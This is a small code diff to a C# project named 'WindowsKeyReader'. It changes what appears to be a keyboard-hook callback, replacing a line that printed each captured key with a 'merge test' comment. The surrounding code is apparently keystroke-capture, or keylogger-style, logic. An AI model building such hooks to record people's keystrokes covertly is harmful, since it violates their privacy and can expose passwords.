@@ -120,7 +120,7 @@ namespace WindowsKeyReader
                 }
                 catch { }
                 ////////////////////////////////////////////////////////////////
-                Console.WriteLine((Keys)vkCode);
+                //Ricus merge test
             }
            
             return CallNextHookEx(hook, nCode, wParam, lParam);
